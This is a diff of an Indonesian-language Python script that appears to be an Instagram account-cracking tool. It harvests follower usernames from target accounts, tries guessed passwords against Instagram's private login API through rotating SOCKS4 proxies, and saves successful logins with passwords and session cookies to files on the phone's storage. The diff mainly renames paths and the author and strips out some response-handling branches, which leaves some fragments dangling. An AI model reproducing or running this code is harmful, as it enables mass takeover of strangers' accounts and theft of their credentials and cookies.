@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding:utf-8
 
-# create by ArifXeyracodev ID 2024
+# create by ArifXd ID 2024
 
 try:
     import uuid, pytz, hmac, hashlib, urllib, shutil, base64
@@ -186,7 +186,7 @@ class Requ:
         
 class Login:
     def __init__(self) -> None:
-        self.data = 'data/login/'
+        self.data = '/sdcard/ArifXd/data/login/'
         pass
         
     def Login_Akun_Instagram(self):
@@ -243,7 +243,7 @@ class Login:
                      }))
                     wr.close()
                 Requ().follow_cookies(cookies)
-                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Selamat Datang [green]{self.username}[grey50]/[green]{self.fullname}[grey50], Run Ulang Perintahnya [green]python Premium.py", title = f"[white]• [green]Success [white]•"))
+                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Selamat Datang [green]{self.username}[grey50]/[green]{self.fullname}[grey50], Run Ulang Perintahnya [green]python Run.py", title = f"[white]• [green]Success [white]•"))
                 exit()
             else:
                 Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Opss, Anda Tidak Memasukan Apapun, Harap Masukan '[green]Cookie Instagram[grey50]'", title = f"[white]• [red]Error Not Found [white]•"))
@@ -333,7 +333,7 @@ class Login:
                          }))
                         wr.close()
                    Requ().follow_cookies(cookies)
-                   Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Selamat Datang [green]{self.username}[grey50]/[green]{self.fullname}[grey50], Run Ulang Perintahnya [green]python Premium.py", title = f"[white]• [green]Success [white]•"))
+                   Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Selamat Datang [green]{self.username}[grey50]/[green]{self.fullname}[grey50], Run Ulang Perintahnya [green]python Run.py", title = f"[white]• [green]Success [white]•"))
                    exit()
                else:
                    Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Opss, Tidak Dapat Mengakses Cookie Anda Perkiraan Akun [yellow]Chekpoint[grey50] Atau [red]Invalid[grey50], Silakan Chek Akun Anda Atau Ganti Tumbal Lain", title = f"[white]• [red]Error Not Found [white]•"))
@@ -378,18 +378,18 @@ class Instagram:
         self.password_manual, self.masukan_sandi, self.amankan_akun, self.unlimited, self.useragent = [],[],[],[],[]
         self.success, self.chekpoint, self.faktor, self.sandi_salah,self.looping = 0,0,0,0,0
         self.Create_Dir()
-        self.data = ('data/login/')
+        self.data = ('/sdcard/ArifXd/data/login/')
         
     def Create_Dir(self):
-        try: os.mkdir('/sdcard/OK')
+        try: os.mkdir('/sdcard/ArifXd/OK')
         except: pass
-        try: os.mkdir('/sdcard/2F')
+        try: os.mkdir('/sdcard/ArifXd/2F')
         except: pass
-        try: os.mkdir('/sdcard/CP')
+        try: os.mkdir('/sdcard/ArifXd/CP')
         except: pass 
-        try: os.mkdir('/sdcard/data')
+        try: os.mkdir('/sdcard/ArifXd/data')
         except: pass 
-        try: os.mkdir('/sdcard/data/login')
+        try: os.mkdir('/sdcard/ArifXd/data/login')
         except: pass 
         
     def Kalender(self):
@@ -437,7 +437,7 @@ class Instagram:
             self.Remove_Cookie() 
         try:                     
             Terminal().Banner_Instagram()
-            Console(width = 65, style = f"{style_terminal}").print(Panel(f"[green]•[grey50]. Exspired : [green]{exspired}", title = f"[white]• [green]Detail Pengguna [white]•", subtitle = f"[white]• [grey50]Sisa [red]{sisa} [grey50]Hari Lagi [white]•[green]•[grey50]. Username : [green]{self.username}", subtitle_align = "center"))
+            Console(width = 65, style = f"{style_terminal}").print(Panel(f"[green]•[grey50]. Username : [green]{self.username} \t[green]•[grey50]. Created : [green]{created}\n[green]•[grey50]. Fullname : [green]{self.fullname} \t[green]•[grey50]. Exspired : [green]{exspired}", title = f"[white]• [green]License Keys [white]•", subtitle = f"[white]• [grey50]Sisa [red]{sisa} [grey50]Hari Lagi [white]•", subtitle_align = "center"))
             #Console(width = 65, style = f"{style_terminal}").print(Panel(f"[green]•[grey50]. Username : [green]{self.username} \t[green]•[grey50]. Fullname [green]{self.fullname}", title = f"[white]• [green]Username And Fullname [white]•"))
         except (AttributeError) as e:
             Terminal().clear_terminalize()
@@ -447,7 +447,7 @@ class Instagram:
         query = Console().input("[grey50]   ╰─> ")
         if query == '01' or query == '1':
             try:
-                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Silahkan Masukan '[green]Username[grey50]' Akun Instagram Target Pastikan Tidak '[red]Terkunci[grey50]' Khusus Untuk Akun '[blue]Centang Biru[grey50]' Bisa Di Dump, Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya : [green]ArifXeyracodev_dev02, ArifXeyracodev_dev03[grey50] Dan Gunakan [red]Ctrl + C[grey50] Untuk Berhenti Dump", title = f"[white]• [green]Catatan [white]•", subtitle = "╭─────", subtitle_align = "left"))
+                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Silahkan Masukan '[green]Username[grey50]' Akun Instagram Target Pastikan Tidak '[red]Terkunci[grey50]' Khusus Untuk Akun '[blue]Centang Biru[grey50]' Bisa Di Dump, Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya : [green]ArifXd_dev02, ArifXd_dev03[grey50] Dan Gunakan [red]Ctrl + C[grey50] Untuk Berhenti Dump", title = f"[white]• [green]Catatan [white]•", subtitle = "╭─────", subtitle_align = "left"))
                 username = Console().input("[grey50]   ╰─> ")
                 for self.username in username.split(','):
                     uid = Requ().Convert_Name(self.username, cookie)
@@ -464,7 +464,7 @@ class Instagram:
                 
         elif query == '02' or query == '2':
             try:
-                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Silahkan Masukan '[green]Username[grey50]' Akun Instagram Target Pastikan Tidak '[red]Terkunci[grey50]' Khusus Untuk Akun '[blue]Centang Biru[grey50]' Bisa Di Dump, Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya : [green]ArifXeyracodev_dev02, ArifXeyracodev_dev03[grey50] Dan Gunakan [red]Ctrl + C[grey50] Untuk Berhenti Dump", title = f"[white]• [green]Catatan [white]•", subtitle = "╭─────", subtitle_align = "left"))
+                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Silahkan Masukan '[green]Username[grey50]' Akun Instagram Target Pastikan Tidak '[red]Terkunci[grey50]' Khusus Untuk Akun '[blue]Centang Biru[grey50]' Bisa Di Dump, Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya : [green]ArifXd_dev02, ArifXd_dev03[grey50] Dan Gunakan [red]Ctrl + C[grey50] Untuk Berhenti Dump", title = f"[white]• [green]Catatan [white]•", subtitle = "╭─────", subtitle_align = "left"))
                 username = Console().input("[grey50]   ╰─> ")
                 for self.username in username.split(','):
                     uid = Requ().Convert_Name(self.username, cookie)
@@ -481,7 +481,7 @@ class Instagram:
                 
         elif query == '03' or query == '3':
             try:
-                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Silahkan Masukan '[green]Username[grey50]' Akun Instagram, Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya : [green]ArifXeyracodev_dev02, ArifXeyracodev_dev03[grey50] Dan Gunakan [red]Ctrl + C[grey50] Untuk Berhenti Dump", title = f"[white]• [green]Catatan [white]•", subtitle = "╭─────", subtitle_align = "left"))
+                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Silahkan Masukan '[green]Username[grey50]' Akun Instagram, Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya : [green]ArifXd_dev02, ArifXd_dev03[grey50] Dan Gunakan [red]Ctrl + C[grey50] Untuk Berhenti Dump", title = f"[white]• [green]Catatan [white]•", subtitle = "╭─────", subtitle_align = "left"))
                 username = Console().input("[grey50]   ╰─> ")
                 for self.username in username.split(','):
                     try: self.Dump_Search(self.username, cookie)
@@ -533,7 +533,7 @@ class Instagram:
             try:
                 Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Silahkan Masukan '[blue]Type Dump[grey50]' Dengan Ketik '[green]followers[grey50]' Untuk Dump Dari [green]Followers[grey50] Dan Ketik '[green]following[grey50]' Untuk Dump Dari [green]Following[grey50], Ketik Menggunakan Huruf Kecil Semua", title = f"[white]• [green]Catatan [white]•", subtitle = "╭─────", subtitle_align = "left"))
                 type_dump = Console().input("[grey50]   ╰─> ")
-                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Silahkan Masukan '[green]Username[grey50]' Akun Instagram Target Pastikan Tidak '[red]Terkunci[grey50]' Dan '[blue]Centang Biru[grey50]' Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya : [green]ArifXeyracodev_dev02, ArifXeyracodev_dev03[grey50] Dan Gunakan [red]Ctrl + C[grey50] Untuk Berhenti Dump", title = f"[white]• [green]Catatan [white]•", subtitle = "╭─────", subtitle_align = "left"))
+                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Silahkan Masukan '[green]Username[grey50]' Akun Instagram Target Pastikan Tidak '[red]Terkunci[grey50]' Dan '[blue]Centang Biru[grey50]' Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya : [green]ArifXd_dev02, ArifXd_dev03[grey50] Dan Gunakan [red]Ctrl + C[grey50] Untuk Berhenti Dump", title = f"[white]• [green]Catatan [white]•", subtitle = "╭─────", subtitle_align = "left"))
                 username = Console().input("[grey50]   ╰─> ")
                 for self.username in username.split(','):
                     uid = Requ().Convert_Name(self.username, cookie)
@@ -553,11 +553,11 @@ class Instagram:
                 Console(width=65).print(Panel('[green]01[grey50]. Chek result Ok   [green]02[grey50]. Chek result 2f   [green]03[grey50]. Chek result Cp',style=f"{style_terminal}",subtitle = "╭─────", subtitle_align = "left"))
                 choose = Console().input("[grey50]   ╰─> ")
                 if choose =='01' or choose =='1':
-                    try: self.result_ok = os.listdir('OK')
+                    try: self.result_ok = os.listdir('/sdcard/ArifXd/OK')
                     except (Exception) as e:
                         Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
                         exit()
-                    Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Berhasil Mengakses Penyimpanan Result Di '[green]/Sdcard/OK/[grey50]'", title = f"[white]• [green] Success [white]•"))
+                    Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Berhasil Mengakses Penyimpanan Result Di '[green]/sdcard/ArifXd/OK/[grey50]'", title = f"[white]• [green] Success [white]•"))
                     for file_ok in self.result_ok: Console().print(f'[green]•[grey50]. {str(file_ok)}')
                     Console(width = 65, style = f"{style_terminal}").print(Panel('[grey50]Silakan Masukan File Crack Anda Dengan Memasukan Salah Satu File Yang Tertera Di Atas, Misalnya : [green]OK-Instagram-24-September-2024', title = f"[white]• [green]Catatan [white]•", subtitle = "╭─────", subtitle_align = "left"))
                     akses_result = Console().input("[grey50]   ╰─> ")
@@ -565,11 +565,11 @@ class Instagram:
                     exit()
                     
                 elif choose =='02' or choose =='2':
-                    try: self.result_two = os.listdir('2F')
+                    try: self.result_two = os.listdir('/sdcard/ArifXd/2F')
                     except (Exception) as e:
                         Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
                         exit()
-                    Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Berhasil Mengakses Penyimpanan Result Di '[red]/Sdcard/2F/[grey50]'", title = f"[white]• [green] Success [white]•"))
+                    Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Berhasil Mengakses Penyimpanan Result Di '[red]/sdcard/ArifXd/2F/[grey50]'", title = f"[white]• [green] Success [white]•"))
                     for file_two in self.result_two: Console().print(f'[red]•[grey50]. {str(file_two)}')
                     Console(width = 65, style = f"{style_terminal}").print(Panel('[grey50]Silakan Masukan File Crack Anda Dengan Memasukan Salah Satu File Yang Tertera Di Atas, Misalnya : [red]2F-Instagram-24-September-2024', title = f"[white]• [green]Catatan [white]•", subtitle = "╭─────", subtitle_align = "left"))
                     akses_result = Console().input("[grey50]   ╰─> ")
@@ -577,11 +577,11 @@ class Instagram:
                     exit()
                     
                 elif choose =='03' or choose =='3':
-                    try: self.result_cp = os.listdir('CP')
+                    try: self.result_cp = os.listdir('/sdcard/ArifXd/CP')
                     except (Exception) as e:
                         Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
                         exit()
-                    Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Berhasil Mengakses Penyimpanan Result Di '[yellow]/Sdcard/CP/[grey50]'", title = f"[white]• [green] Success [white]•"))
+                    Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Berhasil Mengakses Penyimpanan Result Di '[yellow]/sdcard/ArifXd/CP/[grey50]'", title = f"[white]• [green] Success [white]•"))
                     for file_cp in self.result_cp: Console().print(f'[yellow]•[grey50]. {str(file_cp)}')
                     Console(width = 65, style = f"{style_terminal}").print(Panel('[grey50]Silakan Masukan File Crack Anda Dengan Memasukan Salah Satu File Yang Tertera Di Atas, Misalnya : [yellow]CP-Instagram-24-September-2024', title = f"[white]• [green]Catatan [white]•", subtitle = "╭─────", subtitle_align = "left"))
                     akses_result = Console().input("[grey50]   ╰─> ")
@@ -709,17 +709,17 @@ class Instagram:
             
     def Result(self, result, isi):
         if result in ('1','01'):
-            for buka in open(f'OK/'+str(isi)).readlines():
+            for buka in open(f'/sdcard/ArifXd/OK/'+str(isi)).readlines():
                 try: tree = Tree('\r'); tree = tree.add('[b italic green]Response success'); tree.add(f'[italic grey50]username : [green]{buka.split("|")[1]}'); tree.add(f'[italic grey50]fullname : [green]{buka.split("|")[0]}'); tree.add(f'[italic grey50]password : [green]{buka.split("|")[2]}'); true = tree.add('[italic green]Response date'); true.add(f'[italic grey50]data profile : [bold green]{buka.split("|")[3]}[grey50]/[green]{buka.split("|")[4]}[grey50]/[green]{buka.split("|")[5]}'); truu= tree.add('[italic green]Response 2FA'); truu.add(f'[italic grey50]Response : [green]{buka.split("|")[6]}'); truu.add(f'[italic grey50]Response : [green]{buka.split("|")[7]}'); truu.add(f'[iitalic grey50]Response : [green]{buka.split("|")[8]}'); truu.add(f'[italic grey50]Response : [green]{buka.split("|")[9]}'); truu.add(f'[italic grey50]Response : [green]{buka.split("|")[10]}'); truu.add(f'[italic grey50]Response : [green]{buka.split("|")[11]}'); trua = tree.add('[italic green]Response cookie'); trua.add(f'[italic grey50]cookie : [green]{buka.split("|")[12]}'); tree.add("[italic green]Success cek in Result OK"); printz(tree)
                 except Exception: tree = Tree('\r'); tree = tree.add('[italic green]Response success'); tree.add(f'[italic grey50]username : [green]{buka.split("|")[1]}'); tree.add(f'[italic grey50]fullname : [green]{buka.split("|")[0]}'); tree.add(f'[italic grey50]password : [green]{buka.split("|")[2]}'); true = tree.add('[italic green]Response date'); true.add(f'[italic grey50]data profile : [green]{buka.split("|")[3]}[grey50]/[green]{buka.split("|")[4]}[grey50]/[green]{buka.split("|")[5]}'); trua = tree.add('[italic green]Response cookie'); trua.add(f'[italic grey50]cookie : [green]{buka.split("|")[6]}'); tree.add("[italic green]Success cek in Result OK"); printz(tree)
                     
         elif result in ('2','02'):
-            for buka in open(f'2F/'+str(isi)).readlines():
+            for buka in open(f'/sdcard/ArifXd/2F/'+str(isi)).readlines():
                 try: tree = Tree('\r'); tree = tree.add('[italic red]Response 2F'); tree.add(f'[italic grey50]username : [red]{buka.split("|")[1]}'); tree.add(f'[italic grey50]fullname : [red]{buka.split("|")[0]}'); tree.add(f'[italic grey50]password : [red]{buka.split("|")[3]}'); true = tree.add('[italic red]Response date'); true.add(f'[italic grey50]data profile : [red]{buka.split("|")[4]}[grey50]/[red]{buka.split("|")[5]}[grey50]/[red]{buka.split("|")[5]}'); tree.add("[italic red]Success cek in Result 2F"); printz(tree)   
                 except Exception: tree = Tree('\r'); tree = tree.add('[italic red]Response 2F'); tree.add(f'[italic grey50]username : [red]{buka.split("|")[1]}'); tree.add(f'[italic grey50]fullname : [red]{buka.split("|")[0]}'); tree.add(f'[italic grey50]password : [red]{buka.split("|")[3]}'); tree.add("[italic red]Success cek in Result 2F"); printz(tree)   
                 
         elif result in ('3','03'):
-            for buka in open(f'CP/'+str(isi)).readlines():
+            for buka in open(f'/sdcard/ArifXd/CP/'+str(isi)).readlines():
                 try: tree = Tree('\r'); tree = tree.add('[italic yellow]Response Checkpoint'); tree.add(f'[italic grey50]username : [yellow]{buka.split("|")[1]}'); tree.add(f'[italic grey50]fullname : [yellow]{buka.split("|")[0]}'); tree.add(f'[italic grey50]password : [yellow]{buka.split("|")[3]}'); true = tree.add('[italic yellow]Response date'); true.add(f'[italic grey50]data profile : [yellow]{buka.split("|")[4]}[grey50]/[yellow]{buka.split("|")[5]}[grey50]/[yellow]{buka.split("|")[5]}'); tree.add("[italic yellow]Success cek in Result CP"); printz(tree)   
                 except Exception: tree = Tree('\r'); tree = tree.add('[italic yellow]Response Checkpoint'); tree.add(f'[italic grey50]username : [yellow]{buka.split("|")[1]}'); tree.add(f'[italic grey50]fullname : [yellow]{buka.split("|")[0]}'); tree.add(f'[italic grey50]password : [yellow]{buka.split("|")[3]}'); tree.add("[italic yellow]Success cek in Result CP"); printz(tree)   
             
@@ -795,7 +795,7 @@ class Instagram:
         
     def Exec_Private_Api(self, username, password):
         byps = requests.Session()
-        Console().print(f"[grey50]   ──> ([green](Cracking)[grey50]) — ([blue]{'{:.0%}'.format(self.looping/float(len(dump)))}[grey50]/[blue]{str(len(dump))}[grey50]/[blue]{self.looping}[grey50]) — [grey50]([green]Ok[grey50]:[green]{self.success}[grey50]/[red]2f[grey50]:[red]{self.faktor}[grey50]/[yellow]Cp[grey50]:[yellow]{self.chekpoint}[grey50])", end='\r')
+        Console().print(f"[grey50]   ──> ([green]{str(username)[:15]}[grey50]) — ([blue]{'{:.0%}'.format(self.looping/float(len(dump)))}[grey50]/[blue]{str(len(dump))}[grey50]/[blue]{self.looping}[grey50]) — [grey50]([green]Ok[grey50]:[green]{self.success}[grey50]/[red]2f[grey50]:[red]{self.faktor}[grey50]/[yellow]Cp[grey50]:[yellow]{self.chekpoint}[grey50])", end='\r')
         for passwd in password:
             try:
                 hash = hashlib.md5()
@@ -833,7 +833,7 @@ class Instagram:
                     'content-length': str(len(encode)), 'cookie': (";").join([ "%s=%s" % (key, value) for key, value in byps.cookies.get_dict().items() ]),
                 })
                 try:
-                    proxy = {'http': 'socks4://'+str(random.choice(open("Penyimpanan/ProxyTS.txt","r").read().splitlines()))}
+                    proxy = {'http': 'socks4://'+str(random.choice(open("/sdcard/ArifXd/ArifXd/Penyimpanan/Proxyts.Txt","r").read().splitlines()))}
                 except (Exception) as e: Console().print(f"[grey50]   ──>[red] {str(e).title()}", end='\r'); proxy = {'http': 'socks4://184.178.172.26:4145'}
                 response = byps.post('https://b.i.instagram.com/api/v1/accounts/login/', data = encode, proxies = proxy, allow_redirects=True).text
                 self.save_result = self.Simpan_Result()
@@ -920,46 +920,10 @@ class Instagram:
                         tree.add(f'[italic white]Useragent [green]{byps.headers["user-agent"]}')
                         printz(tree)
                         save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}|{users}|{fulls}|{response_facebook}\n'
-                    with open('OK/OK-Instagram-'+self.save_result,'a') as wr:
+                    with open('/sdcard/ArifXd/OK/OK-Instagram-'+self.save_result,'a') as wr:
                         wr.write(save)
                         wr.close()
-                    break          
-                elif 'two_factor_required' in str(response.replace('\\','')):
-                    try: fullname, follower, followed, feedpost, biography, is_private, is_verified, profile_pic_url, profile_pic_url_hd, bussiness = Requ().Validasi_Username(username)
-                    except (UnboundLocalError) as e: pass
-                    tree = Tree('\r                                             ')
-                    tree = tree.add('╭ [italic red]Response A2F')
-                    tree.add(f'[italic white]Username : [red]{username}')
-                    tree.add(f'[italic white]Fullname : [red]{fullname}')
-                    tree.add(f'[italic white]Password : [red]{passwd}')
-                    tree.add(f'[italic white]Profiles : [red]{follower}[grey50]/[red]{followed}[grey50]/[red]{feedpost}')
-                    tree.add(f'[italic white]Useragent : [red]{byps.headers["user-agent"]}')
-                    printz(tree)
-                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
-                    self.faktor+=1
-                    with open('2F/2F-Instagram-'+self.save_result,'a') as wr:
-                        wr.write(save)
-                        wr.close()   
                     break 
-                elif 'challenge_required' in str(response.replace('\\','')):
-                    try: fullname, follower, followed, feedpost, biography, is_private, is_verified, profile_pic_url, profile_pic_url_hd, bussiness = Requ().Validasi_Username(username)
-                    except (UnboundLocalError) as e: pass
-                    tree = Tree('\r                                             ')
-                    tree = tree.add('╭ [italic yellow]Response Checkpoint')
-                    tree.add(f'[italic white]Username : [yellow]{username}')
-                    tree.add(f'[italic white]Fullname : [yellow]{fullname}')
-                    tree.add(f'[italic white]Password : [yellow]{passwd}')
-                    tree.add(f'[italic white]Profiles : [yellow]{follower}[grey50]/[yellow]{followed}[grey50]/[yellow]{feedpost}')
-                    tree.add(f'[italic white]Useragent : [yellow]{byps.headers["user-agent"]}')
-                    printz(tree)
-                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
-                    self.chekpoint+=1
-                    with open('CP/CP-Instagram-'+self.save_result,'a') as wr:
-                        wr.write(save)
-                        wr.close()
-                    break    
-                elif 'ip_block' in str(response.replace('\\','')):
-                    Console().print(f"[grey50]   ──>[red] Hidupkan Mode Pesawat 5 Detik!!", end='\r')
                     time.sleep(3.5)  
                 else: continue   
             except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects): Console().print(f"[grey50]   ──>[red] Koneksi Anda Bermasalah!", end='\r'); time.sleep(31)              
@@ -967,7 +931,7 @@ class Instagram:
         
     def Exec_Private_Api_V2(self, username, password):
         byps = requests.Session()
-        Console().print(f"[grey50]   ──> ([green](Cracking)[grey50]) — ([blue]{'{:.0%}'.format(self.looping/float(len(dump)))}[grey50]/[blue]{str(len(dump))}[grey50]/[blue]{self.looping}[grey50]) — [grey50]([green]Ok[grey50]:[green]{self.success}[grey50]/[red]2f[grey50]:[red]{self.faktor}[grey50]/[yellow]Cp[grey50]:[yellow]{self.chekpoint}[grey50])", end='\r')
+        Console().print(f"[grey50]   ──> ([green]{str(username)[:15]}[grey50]) — ([blue]{'{:.0%}'.format(self.looping/float(len(dump)))}[grey50]/[blue]{str(len(dump))}[grey50]/[blue]{self.looping}[grey50]) — [grey50]([green]Ok[grey50]:[green]{self.success}[grey50]/[red]2f[grey50]:[red]{self.faktor}[grey50]/[yellow]Cp[grey50]:[yellow]{self.chekpoint}[grey50])", end='\r')
         for passwd in password:
             try:
                 byps.headers.update({**Requ().HeadersApiLogin(),
@@ -987,7 +951,7 @@ class Instagram:
                     'content-length': str(len(encode)), 'cookie': (";").join([ "%s=%s" % (key, value) for key, value in byps.cookies.get_dict().items() ]),
                 })
                 try:
-                    proxy = {'http': 'socks4://'+str(random.choice(open("Penyimpanan/ProxyTS.txt","r").read().splitlines()))}
+                    proxy = {'http': 'socks4://'+str(random.choice(open("/sdcard/ArifXd/ArifXd/Penyimpanan/Proxyts.Txt","r").read().splitlines()))}
                 except (Exception) as e: Console().print(f"[grey50]   ──>[red] {str(e).title()}", end='\r'); proxy = {'http': 'socks4://184.178.172.26:4145'}
                 response = byps.post('https://b.i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data = encode, proxies = proxy, allow_redirects=True).text
                 self.save_result = self.Simpan_Result()
@@ -1079,7 +1043,7 @@ class Instagram:
                         tree.add(f'[italic white]Useragent [green]{byps.headers["user-agent"]}')
                         printz(tree)
                         save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}|{users}|{fulls}|{response_facebook}\n'
-                    with open('OK/OK-Instagram-'+self.save_result,'a') as wr:
+                    with open('/sdcard/ArifXd/OK/OK-Instagram-'+self.save_result,'a') as wr:
                         wr.write(save)
                         wr.close()
                     break          
@@ -1096,29 +1060,10 @@ class Instagram:
                     printz(tree)
                     save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                     self.faktor+=1
-                    with open('2F/2F-Instagram-'+self.save_result,'a') as wr:
+                    with open('/sdcard/ArifXd/2F/2F-Instagram-'+self.save_result,'a') as wr:
                         wr.write(save)
                         wr.close()   
                     break 
-                elif 'challenge_required' in str(response.replace('\\','')):
-                    try: fullname, follower, followed, feedpost, biography, is_private, is_verified, profile_pic_url, profile_pic_url_hd, bussiness = Requ().Validasi_Username(username)
-                    except (UnboundLocalError) as e: pass
-                    tree = Tree('\r                                             ')
-                    tree = tree.add('╭ [italic yellow]Response Checkpoint')
-                    tree.add(f'[italic white]Username : [yellow]{username}')
-                    tree.add(f'[italic white]Fullname : [yellow]{fullname}')
-                    tree.add(f'[italic white]Password : [yellow]{passwd}')
-                    tree.add(f'[italic white]Profiles : [yellow]{follower}[grey50]/[yellow]{followed}[grey50]/[yellow]{feedpost}')
-                    tree.add(f'[italic white]Useragent : [yellow]{byps.headers["user-agent"]}')
-                    printz(tree)
-                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
-                    self.chekpoint+=1
-                    with open('CP/CP-Instagram-'+self.save_result,'a') as wr:
-                        wr.write(save)
-                        wr.close()
-                    break    
-                elif 'ip_block' in str(response.replace('\\','')):
-                    Console().print(f"[grey50]   ──>[red] Hidupkan Mode Pesawat 5 Detik!!", end='\r')
                     time.sleep(3.5)  
                 else: continue   
             except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects): Console().print(f"[grey50]   ──>[red] Koneksi Anda Bermasalah!", end='\r'); time.sleep(31)               
@@ -1126,7 +1071,7 @@ class Instagram:
         
     def Exec_Private_Api_Threads(self, username, password):
         byps = requests.Session()
-        Console().print(f"[grey50]   ──> ([green](Cracking)[grey50]) — ([blue]{'{:.0%}'.format(self.looping/float(len(dump)))}[grey50]/[blue]{str(len(dump))}[grey50]/[blue]{self.looping}[grey50]) — [grey50]([green]Ok[grey50]:[green]{self.success}[grey50]/[red]2f[grey50]:[red]{self.faktor}[grey50]/[yellow]Cp[grey50]:[yellow]{self.chekpoint}[grey50])", end='\r')
+        Console().print(f"[grey50]   ──> ([green]{str(username)[:15]}[grey50]) — ([blue]{'{:.0%}'.format(self.looping/float(len(dump)))}[grey50]/[blue]{str(len(dump))}[grey50]/[blue]{self.looping}[grey50]) — [grey50]([green]Ok[grey50]:[green]{self.success}[grey50]/[red]2f[grey50]:[red]{self.faktor}[grey50]/[yellow]Cp[grey50]:[yellow]{self.chekpoint}[grey50])", end='\r')
         for passwd in password:
             try:
                 byps.headers.update({**Requ().HeadersApiLogin(),
@@ -1147,7 +1092,7 @@ class Instagram:
                     'content-length': str(len(encode)), 'cookie': (";").join([ "%s=%s" % (key, value) for key, value in byps.cookies.get_dict().items() ]),
                 })
                 try:
-                    proxy = {'http': 'socks4://'+str(random.choice(open("Penyimpanan/ProxyTS.txt","r").read().splitlines()))}
+                    proxy = {'http': 'socks4://'+str(random.choice(open("/sdcard/ArifXd/ArifXd/Penyimpanan/Proxyts.Txt","r").read().splitlines()))}
                 except (Exception) as e: Console().print(f"[grey50]   ──>[red] {str(e).title()}", end='\r'); proxy = {'http': 'socks4://184.178.172.26:4145'}
                 response = byps.post('https://b.i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data = encode, proxies = proxy, allow_redirects=True).text
                 self.save_result = self.Simpan_Result()
@@ -1239,7 +1184,7 @@ class Instagram:
                         tree.add(f'[italic white]Useragent [green]{byps.headers["user-agent"]}')
                         printz(tree)
                         save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}|{users}|{fulls}|{response_facebook}\n'
-                    with open('OK/OK-Instagram-'+self.save_result,'a') as wr:
+                    with open('/sdcard/ArifXd/OK/OK-Instagram-'+self.save_result,'a') as wr:
                         wr.write(save)
                         wr.close()
                     break          
@@ -1256,37 +1201,17 @@ class Instagram:
                     printz(tree)
                     save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                     self.faktor+=1
-                    with open('2F/2F-Instagram-'+self.save_result,'a') as wr:
+                    with open('/sdcard/ArifXd/2F/2F-Instagram-'+self.save_result,'a') as wr:
                         wr.write(save)
                         wr.close()   
                     break 
-                elif 'challenge_required' in str(response.replace('\\','')):
-                    try: fullname, follower, followed, feedpost, biography, is_private, is_verified, profile_pic_url, profile_pic_url_hd, bussiness = Requ().Validasi_Username(username)
-                    except (UnboundLocalError) as e: pass
-                    tree = Tree('\r                                             ')
-                    tree = tree.add('╭ [italic yellow]Response Checkpoint')
-                    tree.add(f'[italic white]Username : [yellow]{username}')
-                    tree.add(f'[italic white]Fullname : [yellow]{fullname}')
-                    tree.add(f'[italic white]Password : [yellow]{passwd}')
-                    tree.add(f'[italic white]Profiles : [yellow]{follower}[grey50]/[yellow]{followed}[grey50]/[yellow]{feedpost}')
-                    tree.add(f'[italic white]Useragent : [yellow]{byps.headers["user-agent"]}')
-                    printz(tree)
-                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
-                    self.chekpoint+=1
-                    with open('CP/CP-Instagram-'+self.save_result,'a') as wr:
-                        wr.write(save)
-                        wr.close()
-                    break    
-                elif 'ip_block' in str(response.replace('\\','')):
-                    Console().print(f"[grey50]   ──>[red] Hidupkan Mode Pesawat 5 Detik!!", end='\r')
-                    time.sleep(3.5)  
                 else: continue   
